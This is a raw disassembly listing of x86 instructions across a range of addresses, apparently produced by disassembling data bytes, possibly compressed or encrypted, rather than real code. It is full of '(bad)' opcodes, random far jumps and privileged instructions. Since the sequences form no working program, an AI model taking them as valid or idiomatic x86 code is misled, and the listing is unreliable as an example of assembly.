  41aabf:	sub    ecx,ecx
  41aac1:	iret   
  41aac2:	dec    esp
  41aac3:	push   0x5c
  41aac5:	repz imul esp,DWORD PTR [edi+0x7819f565],0x16df8c6d
  41aad0:	leave  
  41aad1:	addr16 push 0x38490d48
  41aad7:	std    
  41aad8:	pop    ebp
  41aad9:	xchg   BYTE PTR [ecx*8-0x441381e5],bh
  41aae0:	outs   dx,BYTE PTR ds:[esi]
  41aae1:	mov    edx,0x2e73689f
  41aae6:	push   esi
  41aae7:	retf   
  41aae8:	pop    ds
  41aae9:	enter  0x97ac,0x12
  41aaed:	fmulp  st(1),st
  41aaef:	add    dl,dl
  41aaf1:	xor    ebx,ebp
  41aaf3:	sub    BYTE PTR [edi-0x21],dh
  41aaf6:	neg    BYTE PTR [edi]
  41aaf8:	popa   
  41aaf9:	shr    BYTE PTR [esi],0xd9
  41aafc:	loopne 0x41ab59
  41aafe:	xor    BYTE PTR [eax+0x122f63a2],al
  41ab04:	cmp    ah,BYTE PTR [eax+edi*1-0x22b89df7]
  41ab0b:	fild   QWORD PTR [eax]
  41ab0d:	enter  0x28b8,0x62
  41ab11:	lock popa 
  41ab13:	sti    
  41ab14:	in     eax,dx
  41ab15:	cmp    bh,BYTE PTR [ecx+ebx*8]
  41ab18:	or     DWORD PTR [ebp+0x6b],eax
  41ab1b:	inc    ebp
  41ab1c:	jnp    0x41aac7
  41ab1e:	mov    ecx,0x995633d6
  41ab23:	and    cl,0x63
  41ab26:	in     eax,0xfb
  41ab28:	out    dx,al
  41ab29:	leave  
  41ab2a:	sbb    ebx,edi
  41ab2c:	or     DWORD PTR [ecx-0x2535a2c9],edi
  41ab32:	pop    ebx
  41ab33:	pop    ds
  41ab34:	mov    dl,BYTE PTR [ebx-0x1f]
  41ab37:	add    al,0xfb
  41ab39:	cld    
  41ab3a:	cmc    
  41ab3b:	adc    edi,DWORD PTR [eax-0x30f1473d]
  41ab41:	and    ch,BYTE PTR [ebx+esi*2]
  41ab44:	stc    
  41ab45:	cli    
  41ab46:	mov    esp,0xae0d2b8
  41ab4b:	or     BYTE PTR [edi+0x68],bh
  41ab4e:	enter  0x724b,0x30
  41ab52:	add    ch,BYTE PTR [edx]
  41ab54:	mov    esi,DWORD PTR ds:0xa8266e12
  41ab5a:	xor    ebp,DWORD PTR [edi]
  41ab5c:	add    ecx,DWORD PTR [edi]
  41ab5e:	mov    edi,0x9188dcf0
  41ab63:	push   ebx
  41ab64:	icebp  
  41ab65:	sbb    DWORD PTR [ebp+0x33],esp
  41ab68:	mov    dh,0x90
  41ab6a:	pop    edx
  41ab6b:	cmc    
  41ab6c:	inc    ebx
  41ab6d:	rcr    DWORD PTR [ebp-0x36],1
  41ab70:	jmp    0x1dd38924
  41ab75:	xchg   esp,eax
  41ab76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab77:	xchg   ecx,eax
  41ab78:	jge    0x41abca
  41ab7a:	adc    dh,BYTE PTR [ebp+0x10]
  41ab7d:	jmp    0xd5ef0b8b
  41ab82:	xor    DWORD PTR [edx],esp
  41ab84:	adc    DWORD PTR [ebp+0x42],0xfffffff9
  41ab88:	shl    BYTE PTR [ecx-0x752221d8],cl
  41ab8e:	scas   eax,DWORD PTR es:[edi]
  41ab8f:	fwait
  41ab90:	mov    ebx,0xe848e1a0
  41ab95:	sbb    DWORD PTR [eax+ebx*4],0x3f
  41ab99:	mov    dl,0xc2
  41ab9b:	out    dx,eax
  41ab9c:	adc    DWORD PTR ds:0xd865edf6,eax
  41aba2:	push   ebx
  41aba3:	iret   
  41aba4:	inc    ebp
  41aba5:	loop   0x41ab84
  41aba7:	push   cs
  41aba8:	out    0x6,eax
  41abaa:	jbe    0x41abfc
  41abac:	sti    
  41abad:	xchg   ebp,eax
  41abae:	arpl   sp,si
  41abb0:	pop    es
  41abb1:	jmp    0x41ab48
  41abb3:	fadd   DWORD PTR [esi+0x684b90d1]
  41abb9:	mov    al,0xb5
  41abbb:	cmp    DWORD PTR [edi],ecx
  41abbd:	dec    ecx
  41abbe:	jecxz  0x41ac32
  41abc0:	xchg   ecx,eax
  41abc1:	jb     0x41abc0
  41abc3:	jno    0x41abe2
  41abc5:	sub    al,0x5c
  41abc7:	std    
  41abc8:	xchg   edx,eax
  41abc9:	stc    
  41abca:	sbb    al,0xb
  41abcc:	push   ecx
  41abcd:	inc    ebx
  41abce:	jno    0x41ac48
  41abd0:	pop    esp
  41abd1:	mov    dh,0x4c
  41abd3:	std    
  41abd4:	sar    ecx,cl
  41abd6:	sub    eax,0x3e62dee3
  41abdb:	fldcw  WORD PTR [ebp+0x5a]
  41abde:	cmp    cl,bl
  41abe0:	or     DWORD PTR [ecx-0x35b01497],ecx
  41abe6:	test   DWORD PTR [esi+edx*1],ecx
  41abe9:	and    ch,BYTE PTR [ebp-0x4a]
  41abec:	setne  BYTE PTR [edi-0x767ec02b]
  41abf3:	mov    ebp,0x85924b62
  41abf8:	pop    eax
  41abf9:	leave  
  41abfa:	mov    ch,0x25
  41abfc:	in     eax,dx
  41abfd:	pop    edi
  41abfe:	dec    ebp
  41abff:	and    dh,BYTE PTR [edi+0x4e64449]
  41ac05:	(bad)  
  41ac06:	and    al,0xd3
  41ac08:	sub    al,0xd9
  41ac0a:	sbb    DWORD PTR [edx],esi
  41ac0c:	cld    
  41ac0d:	fsubp  st(4),st
  41ac0f:	test   BYTE PTR [edi],al
  41ac11:	sub    ebp,DWORD PTR [ecx-0x2fa5e4e6]
  41ac17:	mov    ebp,0x33343465
  41ac1c:	mov    BYTE PTR [edx],bl
  41ac1e:	gs xchg ebp,eax
  41ac20:	mov    ds:0x6935d50b,al
  41ac25:	repz xor ebx,DWORD PTR [edx]
  41ac28:	es ret 0xc608
  41ac2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac2d:	jo     0x41ac57
  41ac2f:	fst    DWORD PTR [eax]
  41ac31:	and    bh,BYTE PTR [ecx+0x210bd9cb]
  41ac37:	push   0x975a5e15
  41ac3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac3d:	mov    esp,DWORD PTR [ecx+eax*1-0x15]
  41ac41:	xchg   esi,eax
  41ac42:	adc    eax,0xa7ec42b4
  41ac47:	ins    DWORD PTR es:[edi],dx
  41ac48:	outs   dx,DWORD PTR ds:[esi]
  41ac49:	push   ebp
  41ac4a:	fs loopne 0x41ac30
  41ac4d:	pop    edi
  41ac4e:	xor    eax,0x18d26914
  41ac53:	scas   eax,DWORD PTR es:[edi]
  41ac54:	fxch   st(0)
  41ac56:	inc    edi
  41ac57:	sar    BYTE PTR [eax+0x9],1
  41ac5a:	xchg   ebp,eax
  41ac5b:	shl    BYTE PTR [ebx-0x38],1
  41ac5e:	scas   eax,DWORD PTR es:[edi]
  41ac5f:	fstp   TBYTE PTR [ebx+0x7f]
  41ac62:	mov    ds:0x42a42a41,al
  41ac67:	leave  
  41ac68:	ret    
  41ac69:	jmp    0x41ace0
  41ac6b:	sub    al,0x51
  41ac6d:	push   0x16
  41ac6f:	lock out 0x7b,eax
  41ac72:	adc    DWORD PTR [edi+ebp*1+0x41],esp
  41ac76:	adc    DWORD PTR [esi+0x1c],edi
  41ac79:	and    al,0x1f
  41ac7b:	sub    DWORD PTR [ebx-0x26],eax
  41ac7e:	sub    ecx,0x60931cfe
  41ac84:	add    edi,DWORD PTR [edi+0x5]
  41ac87:	loope  0x41ac58
  41ac89:	test   BYTE PTR [edi+0x3],bl
  41ac8c:	fld    st(6)
  41ac8e:	push   0xc
  41ac90:	xor    BYTE PTR [edx+0x54],dh
  41ac93:	shl    dh,1
  41ac95:	jmp    0x41acf7
  41ac97:	cmc    
  41ac98:	aas    
  41ac99:	bound  esi,QWORD PTR [eax]
  41ac9b:	sub    al,0x37
  41ac9d:	aam    0xbe
  41ac9f:	inc    esp
  41aca0:	das    
  41aca1:	mov    ebp,0x18d73bab
  41aca6:	das    
  41aca7:	(bad)  
  41aca9:	int3   
  41acaa:	or     cl,BYTE PTR [esi-0x59]
  41acad:	sbb    al,0x3c
  41acaf:	mov    ecx,0x5e640bd4
  41acb4:	retf   
  41acb5:	inc    edi
  41acb6:	sbb    ah,BYTE PTR [edx+0x3e3ec205]
  41acbc:	mov    ah,0xdb
  41acbe:	xor    eax,0x3df9ed0b
  41acc3:	jp     0x41ac90
  41acc5:	gs call 0xcaa00ccf
  41accb:	pop    esp
  41accc:	movsx  edi,WORD PTR [edx]
  41accf:	sub    BYTE PTR [ebp+0x42ca3ff3],ch
  41acd5:	push   es
  41acd6:	lods   al,BYTE PTR ds:[esi]
  41acd7:	adc    DWORD PTR [ecx],esi
  41acd9:	xchg   ebp,eax
  41acda:	dec    esi
  41acdb:	mov    edi,0xf7035bbf
  41ace0:	in     al,dx
  41ace1:	inc    ebp
  41ace2:	push   edx
  41ace3:	(bad)  
  41ace4:	jmp    0xe3bb0eb1
  41ace9:	adc    bl,BYTE PTR [edi]
  41aceb:	mul    BYTE PTR [ecx-0x3a784291]
  41acf1:	inc    ecx
  41acf2:	push   es
  41acf3:	ja     0x41ad12
  41acf5:	(bad)  
  41acf6:	(bad)  
  41acf8:	sub    esi,DWORD PTR [esi-0x19]
  41acfb:	jecxz  0x41acd6
  41acfd:	add    eax,0xb3b0e2ed
  41ad02:	pop    ds
  41ad03:	pushf  
  41ad04:	cdq    
  41ad05:	mov    al,ds:0xc1a02d34
  41ad0a:	call   0xf1006d45
  41ad0f:	clc    
  41ad10:	nop
  41ad11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad12:	xchg   ebx,eax
  41ad13:	mov    DWORD PTR [ebx+0x5ef81415],edi
  41ad19:	sub    DWORD PTR [edx+0x4a],esi
  41ad1c:	fstp   DWORD PTR [ebp+0x34]
  41ad1f:	imul   edi,DWORD PTR [eax-0x8b8ae4c],0xfffffffa
  41ad26:	in     al,dx
  41ad27:	int3   
  41ad28:	dec    ecx
  41ad29:	sub    DWORD PTR [ecx+0x0],ebp
  41ad2c:	dec    esp
  41ad2d:	outs   dx,DWORD PTR ds:[esi]
  41ad2e:	pop    ecx
  41ad2f:	push   edx
  41ad30:	adc    al,0x71
  41ad32:	mov    dl,0x80
  41ad34:	aam    0x47
  41ad36:	inc    esp
  41ad37:	jmp    0x41ada7
  41ad39:	xchg   dh,dh
  41ad3b:	fwait
  41ad3c:	aaa    
  41ad3d:	sar    eax,cl
  41ad3f:	loop   0x41ad49
  41ad41:	loop   0x41ad18
  41ad43:	pusha  
  41ad44:	dec    cx
  41ad46:	cld    
  41ad47:	sbb    bl,bh
  41ad49:	cld    
  41ad4a:	or     dh,cl
  41ad4c:	cli    
  41ad4d:	push   ds
  41ad4e:	mov    dh,0xdd
  41ad50:	jnp    0x41acf0
  41ad52:	jg     0x41ad10
  41ad54:	aaa    
  41ad55:	sbb    al,0x90
  41ad57:	mov    al,0xb0
  41ad59:	adc    BYTE PTR [edi-0x30e0213c],ch
  41ad5f:	imul   edi,DWORD PTR [ecx-0x56],0xa3541588
  41ad66:	jge    0x41ad3c
  41ad68:	and    ch,ah
  41ad6a:	pop    ecx
  41ad6b:	pop    edi
  41ad6c:	(bad)  
  41ad6d:	push   edi
  41ad6e:	push   esp
  41ad6f:	rcr    BYTE PTR [esi+0x6f],0x6d
  41ad73:	cmp    DWORD PTR [ebp-0x2b],ecx
  41ad76:	xor    eax,0xb1eeb63b
  41ad7b:	popa   
  41ad7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad7d:	leave  
  41ad7e:	sub    ah,BYTE PTR [esi+0x494bf0c5]
  41ad84:	or     eax,0xd376af87
  41ad89:	repnz mov edi,0x94829b5e
  41ad8f:	inc    edi
  41ad90:	push   DWORD PTR ds:0xb1a0b7ab
  41ad96:	popa   
  41ad97:	test   eax,0xce5162a4
  41ad9c:	mov    ah,0xe3
  41ad9e:	xor    eax,0x1e2c9c7
  41ada3:	test   eax,0x2a37fe1c
  41ada8:	scas   al,BYTE PTR es:[edi]
  41ada9:	cmp    BYTE PTR [edi+0x1af84206],bh
  41adaf:	ins    BYTE PTR es:[edi],dx
  41adb0:	cmp    al,0x6d
  41adb2:	cld    
  41adb3:	xor    eax,0xe4e1f2f0
  41adb8:	in     al,dx
  41adb9:	xchg   edi,eax
  41adba:	push   ebx
  41adbb:	xchg   BYTE PTR [ebx-0x2e],al
  41adbe:	mov    esi,0x4811a75f
  41adc3:	cmp    dh,BYTE PTR [ecx+0x2b]
  41adc6:	bound  edx,QWORD PTR [ebx+0x44]
  41adc9:	xor    BYTE PTR [ecx-0x11],ch
  41adcc:	fmulp  st(4),st
  41adce:	loop   0x41ae2e
  41add0:	xor    DWORD PTR [ebx],esi
  41add2:	push   ds
  41add3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41add4:	div    eax
  41add6:	in     eax,0x9a
  41add8:	xor    BYTE PTR [edi],dh
  41adda:	fnstcw WORD PTR [eax+0x3bb6cdaa]
  41ade0:	call   0xc68b3096
  41ade5:	cmp    bl,bh
  41ade7:	mov    WORD PTR [esi-0x17],dx
  41adeb:	or     eax,0xf9d67a41
  41adf0:	xchg   BYTE PTR [ebp-0x4b],dh
  41adf3:	cwde   
  41adf4:	dec    edi
  41adf5:	fcmovbe st,st(2)
  41adf7:	lahf   
  41adf8:	jmp    0x3bd3:0x9365c4a0
  41adff:	dec    edx
  41ae00:	fdiv   DWORD PTR [esi+eax*1]
  41ae03:	jmp    0xa2fd:0xce66cce2
  41ae0a:	or     ebx,DWORD PTR [esi+0x76]
  41ae0d:	aaa    
  41ae0e:	repz aam 0xf9
  41ae11:	cdq    
  41ae12:	inc    ecx
  41ae13:	pusha  
  41ae14:	pop    edx
  41ae15:	(bad)  [eax]
  41ae17:	fisubr WORD PTR [eax+0x1d6a681c]
  41ae1d:	shl    edi,0x94
  41ae20:	jg     0x41ae00
  41ae22:	sub    BYTE PTR ds:[ebx+ebp*2+0x2f055721],ch
  41ae2a:	int3   
  41ae2b:	add    eax,0xa5523cb3
  41ae30:	mov    esi,0x48f4e915
  41ae35:	fisub  WORD PTR [ebp+0x3425d849]
  41ae3b:	add    eax,0x8f272775
  41ae40:	jg     0x41ae1d
  41ae42:	inc    ebx
  41ae43:	and    eax,0x90ff93bd
  41ae48:	cld    
  41ae49:	scas   al,BYTE PTR es:[edi]
  41ae4a:	(bad)  
  41ae4b:	test   ecx,esi
  41ae4d:	lock or bl,bh
  41ae50:	pushw  0xffa0
  41ae53:	mov    ah,0xfd
  41ae55:	pop    esi
  41ae56:	dec    edi
  41ae57:	or     al,0x4f
  41ae59:	lods   al,BYTE PTR ds:[esi]
  41ae5a:	push   edi
  41ae5b:	push   es
  41ae5c:	mov    dh,0x46
  41ae5e:	and    al,0xcf
  41ae60:	mov    ebx,DWORD PTR [bp+si-0x53ef]
  41ae65:	pop    ebp
  41ae66:	jns    0x41ae82
  41ae68:	(bad)  
  41ae69:	sub    eax,0x58db03ce
  41ae6e:	pop    ecx
  41ae6f:	and    esi,DWORD PTR [ecx+0x3b]
  41ae72:	scas   al,BYTE PTR es:[edi]
  41ae73:	inc    edx
  41ae74:	sti    
  41ae75:	push   esi
  41ae76:	xlat   BYTE PTR ds:[ebx]
  41ae77:	mov    eax,ds:0xb81cae05
  41ae7c:	xchg   ebp,eax
  41ae7d:	xchg   ebp,eax
  41ae7e:	xchg   edi,ebp
  41ae80:	ins    BYTE PTR es:[edi],dx
  41ae81:	aam    0xaf
  41ae83:	pop    esp
  41ae84:	add    BYTE PTR [ebp+0x32],cl
  41ae87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae88:	(bad)  
  41ae89:	fs std 
  41ae8b:	lods   eax,DWORD PTR ds:[esi]
  41ae8c:	jge    0x41ae20
  41ae8e:	and    DWORD PTR [esi-0x36],ebp
  41ae91:	test   al,0xef
  41ae93:	mov    dh,0x66
  41ae95:	or     al,BYTE PTR [eax]
  41ae97:	mov    BYTE PTR [ebx-0x3d82a70a],dh
  41ae9d:	addr16 test eax,0x31463fe8
  41aea3:	mov    eax,ds:0x6319eef5
  41aea9:	sub    al,0xdd
  41aeab:	jge    0x41aec2
  41aead:	dec    edi
  41aeae:	hlt    
  41aeaf:	dec    esi
  41aeb0:	sub    ebp,edi
  41aeb2:	mov    edx,0xe2faebad
  41aeb7:	add    ebp,ebx
  41aeb9:	mov    bh,0x57
  41aebb:	or     esp,edx
  41aebd:	jae    0x41af04
  41aebf:	adc    DWORD PTR [esi+esi*8-0x315f36a0],esi
  41aec6:	(bad)  
  41aec8:	in     eax,0x53
  41aeca:	scas   al,BYTE PTR es:[edi]
  41aecb:	jl     0x41af0e
  41aecd:	mov    ebp,0xa8db3183
  41aed2:	jecxz  0x41aeef
  41aed4:	adc    al,0x62
  41aed6:	scas   al,BYTE PTR es:[edi]
  41aed7:	dec    edx
  41aed8:	aas    
  41aed9:	dec    edx
  41aeda:	lods   eax,DWORD PTR ds:[esi]
  41aedb:	mov    al,BYTE PTR [ebx]
  41aedd:	in     eax,dx
  41aede:	imul   ebx,esp,0xd2364699
  41aee4:	addr16 sub al,0xb2
  41aee7:	fimul  WORD PTR [ebx+0x7928698f]
  41aeed:	lea    ebp,[eax]
  41aeef:	push   edi
  41aef0:	dec    ebp
  41aef1:	add    ebx,edx
  41aef3:	outs   dx,BYTE PTR ds:[esi]
  41aef4:	xor    DWORD PTR [edx+0x74e1ec3c],ebx
  41aefa:	int3   
  41aefb:	rcr    BYTE PTR [ebp-0x49],0x1d
  41aeff:	push   0xffffff94
  41af01:	rcr    BYTE PTR es:[eax-0x5a],0xcc
  41af06:	or     ebx,DWORD PTR ss:[eax+0x6f]
  41af0a:	in     eax,0x28
  41af0c:	xchg   BYTE PTR [esi],bh
  41af0e:	adc    edi,edi
  41af10:	mov    dh,ah
  41af12:	inc    ebx
  41af13:	sbb    DWORD PTR [esi-0x4e],0x9
  41af17:	xor    cl,BYTE PTR [ecx+0x6260372a]
  41af1d:	cli    
  41af1e:	aas    
  41af1f:	in     al,0x9
  41af21:	push   ecx
  41af22:	sbb    BYTE PTR [eax],ah
  41af24:	jmp    0x3d47b939
  41af29:	in     al,dx
  41af2a:	(bad)  
  41af2b:	xchg   DWORD PTR [ebx],eax
  41af2d:	fst    DWORD PTR [eax]
  41af2f:	(bad)  
  41af30:	dec    eax
  41af31:	jb     0x41aef9
  41af33:	sbb    al,0x6b
  41af35:	arpl   ax,ax
  41af37:	call   0x483e:0xdefa0b22
  41af3e:	mov    ecx,0x3cd5616c
  41af43:	shl    dh,1
  41af45:	add    al,0x69
  41af47:	and    BYTE PTR [esi],dh
  41af49:	jg     0x41aecc
  41af4b:	leave  
  41af4c:	ds adc al,0x84
  41af4f:	mov    cl,0x6b
  41af51:	xor    bh,BYTE PTR [ecx+0x74]
  41af54:	cmp    al,0x76
  41af56:	into   
  41af57:	and    ah,ch
  41af59:	jae    0x41afd6
  41af5b:	adc    DWORD PTR [edx+eax*2-0x51],ecx
  41af5f:	icebp  
  41af60:	stos   BYTE PTR es:[edi],al
  41af61:	mov    BYTE PTR [ebx],ch
  41af63:	cs mov al,0x2
  41af66:	push   es
  41af67:	jecxz  0x41aefb
  41af69:	or     al,0x5b
  41af6c:	hlt    
  41af6d:	fistp  WORD PTR [ecx+edx*2-0x42]
  41af71:	pop    esi
  41af72:	jne    0x41af38
  41af74:	jne    0x41afb8
  41af76:	dec    esi
  41af77:	mov    es,WORD PTR [edx-0x53]
  41af7a:	imul   DWORD PTR [ebx+0x4ee551df]
  41af80:	mov    edi,0xc2e8a89a
  41af85:	add    eax,0x4d7faf70
  41af8a:	inc    edx
  41af8b:	cmp    esi,ebp
  41af8d:	sahf   
  41af8e:	stos   DWORD PTR es:[edi],eax
  41af8f:	cdq    
  41af90:	and    DWORD PTR fs:[ecx+0x1e],ebp
  41af94:	loope  0x41afc9
  41af96:	mov    WORD PTR [ecx+0xa],es
  41af99:	cmp    DWORD PTR cs:[eax+0x69f9c6d3],esi
  41afa0:	aaa    
  41afa1:	mov    cl,BYTE PTR [esi]
  41afa3:	fdiv   DWORD PTR [edi-0x61]
  41afa6:	and    edi,0x7d
  41afa9:	push   ds
  41afaa:	js     0x41b00e
  41afac:	mov    al,0x84
  41afae:	rol    BYTE PTR [ebx],cl
  41afb0:	(bad)  
  41afb1:	loope  0x41b01f
  41afb3:	scas   eax,DWORD PTR es:[edi]
  41afb4:	push   esi
  41afb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afb6:	pop    esp
  41afb7:	push   edi
  41afb8:	les    esi,FWORD PTR [ebp+0x241b25db]
  41afbe:	(bad)  
  41afbf:	xchg   ecx,eax
  41afc0:	retf   0x6380
  41afc3:	loope  0x41af7c
  41afc5:	mov    edx,ecx
  41afc7:	bound  ecx,QWORD PTR [eax+0x202ca430]
  41afcd:	ror    BYTE PTR [ecx+0xa],1
  41afd0:	xchg   ecx,eax
  41afd1:	inc    eax
  41afd2:	cmp    ch,BYTE PTR [esi]
  41afd4:	in     eax,0xc7
  41afd6:	scas   al,BYTE PTR es:[edi]
  41afd7:	push   edx
  41afd8:	loop   0x41b045
  41afda:	dec    esp
  41afdb:	nop
  41afdc:	and    al,0x2b
  41afde:	test   edi,esi
  41afe0:	scas   eax,DWORD PTR es:[edi]
  41afe1:	add    DWORD PTR [ebp+0x1],0x55583bc2
  41afe8:	xor    al,0x78
  41afea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afeb:	(bad)  
  41afec:	sar    DWORD PTR [edi-0x5263d837],1
  41aff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aff3:	cld    
  41aff4:	mov    eax,ds:0x3859753
  41aff9:	mov    dh,0x42
  41affb:	inc    edx
  41affc:	adc    eax,DWORD PTR [ebx+0x388e0cb7]
  41b002:	inc    eax
  41b003:	adc    ah,ah
  41b005:	inc    DWORD PTR [edx]
  41b007:	inc    ebp
  41b008:	or     ebp,DWORD PTR [edx]
  41b00a:	and    BYTE PTR [ecx],bh
  41b00c:	stos   BYTE PTR es:[edi],al
  41b00d:	and    BYTE PTR [eax+eax*8-0x55ca1792],0xa0
  41b015:	jns    0x41b020
  41b017:	adc    edi,DWORD PTR [edi]
  41b019:	mov    WORD PTR [ebp+0x2d],?
  41b01c:	imul   esi,DWORD PTR [ebx+0x27ef08ba],0x76
  41b023:	or     al,0x76
  41b025:	(bad)
  41b028:	dec    ebx
  41b029:	jecxz  0x41b00d
  41b02b:	push   0x1b
  41b02d:	push   eax
  41b02e:	or     DWORD PTR es:[eax-0x50b3ff75],ecx
  41b035:	rcr    DWORD PTR [eax],cl
  41b037:	fisubr DWORD PTR [esi]
  41b039:	push   cs
  41b03a:	rcr    DWORD PTR [ebp-0x7bafaa57],0xda
  41b041:	cmp    bl,cl
  41b043:	lahf   
  41b044:	inc    esi
  41b045:	ja     0x41b0c3
  41b047:	js     0x41b09d
  41b049:	cmp    DWORD PTR [edx+ebp*4+0x4],edx
  41b04d:	sub    DWORD PTR [esi-0x4e],ebp
  41b050:	jo     0x41b07e
  41b052:	lods   al,BYTE PTR ds:[esi]
  41b053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b054:	test   eax,0x30df091f
  41b059:	dec    edx
  41b05a:	cmp    DWORD PTR [eax-0x13],eax
  41b05d:	cmp    dh,al
  41b05f:	iret   
  41b060:	adc    BYTE PTR [edi],ch
  41b062:	pop    es
  41b063:	je     0x41b093
  41b065:	cwde   
  41b066:	scas   eax,DWORD PTR es:[edi]
  41b067:	cwde   
  41b068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b069:	ds xor eax,0xc7f4e7fa
  41b06f:	xchg   esi,eax
  41b070:	loopne 0x41b079
  41b072:	fsubp  st(5),st
  41b074:	hlt    
  41b075:	sbb    ch,BYTE PTR [esp+eiz*8+0x6f]
  41b079:	test   eax,0xc51cad4a
  41b07e:	push   es
  41b07f:	fcomip st,st(6)
  41b081:	fnstcw WORD PTR [ebx-0x75]
  41b084:	int    0x90
  41b086:	jnp    0x41b00b
  41b088:	sbb    ecx,DWORD PTR [ebx-0x27a3b886]
  41b08e:	retf   
  41b08f:	pop    esp
  41b090:	mov    edi,0x8a805528
  41b095:	(bad)  [eax]
  41b097:	pop    esp
  41b098:	sbb    BYTE PTR [ebx+0x516b74ac],bh
  41b09e:	lahf   
  41b09f:	aam    0x37
  41b0a1:	pusha  
  41b0a2:	and    BYTE PTR [esi+0x3d],0x42
  41b0a6:	cld    
  41b0a7:	xchg   DWORD PTR [edx+0x652b7780],eax
  41b0ad:	ror    dl,1
  41b0af:	rol    DWORD PTR [eax],cl
  41b0b1:	jle    0x41b0eb
  41b0b3:	shl    ch,0x2
  41b0b6:	ret    0xdf58
  41b0b9:	add    bh,dh
  41b0bb:	mov    ds:0x97bf96a0,al
  41b0c0:	fadd   st,st(1)
  41b0c2:	xchg   esp,eax
  41b0c3:	pop    esi
  41b0c4:	pop    ds
  41b0c5:	mov    DWORD PTR [ebx],ecx
  41b0c7:	test   al,0x21
  41b0c9:	or     ebp,esp
  41b0cb:	push   0x3d6c3138
  41b0d0:	lahf   
  41b0d1:	sub    DWORD PTR [edx-0x4a],ecx
  41b0d4:	cli    
  41b0d5:	arpl   bp,ax
  41b0d7:	aas    
  41b0d8:	das    
  41b0d9:	jo     0x41b134
  41b0db:	dec    ebp
  41b0dc:	push   ebx
  41b0dd:	das    
  41b0de:	in     eax,dx
  41b0df:	ds cmp eax,ebp
  41b0e2:	cs scas eax,DWORD PTR es:[edi]
  41b0e4:	not    bl
  41b0e6:	cmp    BYTE PTR [ecx],0xe7
  41b0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0ea:	es gs sahf 
  41b0ed:	add    eax,0x72ea5091
  41b0f2:	mov    ds:0xfb173113,eax
  41b0f7:	mov    dl,0xa3
  41b0f9:	ror    esi,0x13
  41b0fc:	xor    esp,DWORD PTR ds:0x99f42b74
  41b102:	jb     0x41b0c1
  41b104:	or     ah,bh
  41b106:	pop    ss
  41b107:	dec    ecx
  41b108:	cmp    DWORD PTR [ebp-0xc70785f],eax
  41b10e:	lods   al,BYTE PTR ds:[esi]
  41b10f:	mov    dl,0xff
  41b111:	inc    eax
  41b112:	lea    esp,[eax+0x77e6d3a]
  41b118:	stc    
  41b119:	inc    ebx
  41b11a:	ret    0x5768
  41b11d:	sbb    bl,ch
  41b11f:	jge    0x41b10c
  41b121:	lock jns 0x41b136
  41b124:	mov    bl,BYTE PTR [esi-0x340d7956]
  41b12a:	ss (bad) 
  41b12c:	mov    edi,0x94e2f5b1
  41b131:	mov    cl,0xfb
  41b133:	(bad)  
  41b134:	pop    edi
  41b135:	aad    0x19
  41b137:	lods   eax,DWORD PTR ds:[esi]
  41b138:	add    eax,0x367614c2
  41b13d:	cmp    dl,BYTE PTR [ebx-0x3c]
  41b140:	dec    ebp
  41b141:	xchg   ecx,eax
  41b142:	fidiv  WORD PTR [edx+0xe5f4869]
  41b148:	out    dx,al
  41b149:	cmp    BYTE PTR [esi],ch
  41b14b:	mov    ebx,DWORD PTR [esi-0x64]
  41b14e:	out    0x9e,eax
  41b150:	icebp  
  41b151:	out    dx,eax
  41b152:	push   0xba32c4a0
  41b157:	mov    BYTE PTR [esi+0x6792e38e],bl
  41b15d:	inc    esi
  41b15e:	jns    0x41b136
  41b160:	popf   
  41b161:	aad    0xc8
  41b163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b164:	mov    ebx,0x89bf7585
  41b169:	ja     0x41b146
  41b16b:	in     al,0xc2
  41b16d:	les    ecx,FWORD PTR [edi-0x39]
  41b170:	push   ds
  41b171:	inc    esp
  41b172:	imul   eax,DWORD PTR ds:0x4f4f639c,0xffffffe5
  41b179:	xor    al,0x68
  41b17b:	sub    BYTE PTR [eax+eiz*4+0x73],dh
  41b17f:	xlat   BYTE PTR ds:[ebx]
  41b180:	pop    eax
  41b181:	sbb    dh,BYTE PTR [esi+ebx*1-0x4b]
  41b185:	lods   eax,DWORD PTR ds:[esi]
  41b186:	leave  
  41b187:	fwait
  41b188:	loopne 0x41b1d4
  41b18a:	push   ebp
  41b18b:	int    0x8b
  41b18d:	jle    0x41b124
  41b18f:	mov    esi,0xf4b1a037
  41b194:	into   
  41b195:	fucomp st(2)
  41b197:	xchg   edx,eax
  41b198:	cdq    
  41b199:	ficomp DWORD PTR [edx-0x3b]
  41b19c:	inc    ebp
  41b19d:	or     BYTE PTR [eax],bl
  41b19f:	dec    ebx
  41b1a0:	add    esi,DWORD PTR [ebx+ebp*2+0x60e70dfe]
  41b1a7:	mov    bl,0x8e
  41b1a9:	cli    
  41b1aa:	iret   
  41b1ab:	js     0x41b155
  41b1ad:	dec    eax
  41b1ae:	mov    bl,0x47
  41b1b0:	rcr    DWORD PTR [ebp-0x6169933d],1
  41b1b6:	adc    DWORD PTR [ebp+ecx*8-0x2ad49431],ebp
  41b1bd:	sahf   
  41b1be:	inc    esi
  41b1bf:	push   edx
  41b1c0:	adc    al,0xfa
  41b1c2:	popa   
  41b1c3:	xchg   BYTE PTR [ecx-0x538938eb],bl
  41b1c9:	pushf  
  41b1ca:	jg     0x41b193
  41b1cc:	or     ecx,DWORD PTR [edi+0x7b]
  41b1cf:	rcr    esi,0xd1
  41b1d2:	cwde   
  41b1d3:	mov    ?,WORD PTR [ecx]
  41b1d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1d6:	stos   BYTE PTR es:[edi],al
  41b1d7:	jo     0x41b19f
  41b1d9:	das    
  41b1da:	jne    0x41b1a5
  41b1dc:	fcmovnu st,st(1)
